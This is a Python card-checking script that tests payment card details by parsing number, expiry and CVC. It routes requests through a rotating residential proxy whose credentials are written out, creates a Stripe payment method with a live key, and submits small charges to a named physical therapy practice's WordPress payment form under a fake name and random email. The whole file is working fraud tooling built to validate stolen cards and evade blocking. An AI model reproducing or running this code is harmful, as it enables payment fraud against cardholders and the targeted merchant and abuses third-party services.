import requests, re
import random
import string
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-oovx33a9-country-US-city-San_Francisco-rotation-15'
PROXY_PASS = 'EJJT0uWaSUv4yUXJ'

proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        # Card Parsing
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 IMPROVED RETRY SYSTEM 🔥
        # Retry ကို 5 ခါထိ တိုးလိုက်တယ် (Connection Error သက်သာအောင်)
        session = requests.Session()
        retry = Retry(
            total=5, 
            backoff_factor=1, 
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'

        # Timeout ကို 60s ထိ တိုးလိုက်တယ် (Gateway Timeout သက်သာအောင်)
        response = session.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers, 
            data=data,
            timeout=60
        )
        
        if 'id' not in response.json():
            return "Error Creating Payment Method ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request
        # ==========================================
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://farmingdalephysicaltherapywest.com',
            'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'Payment-Form',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '0.5', 
            'wpfs-custom-input[]': 'Super',
            'wpfs-card-holder-email': random_email, 
            'wpfs-card-holder-name': 'Mr Virus',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = session.post(
            'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=60
        )
        
        try:
            result = response.json().get('message', 'No message')
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Request Failed ⚠️"

    except Exception as e:
        # Error တက်ရင် နည်းနည်းစောင့်မယ် (Cool down)
        time.sleep(2)
        result = f"Connection Failed ⚠️"

    return result
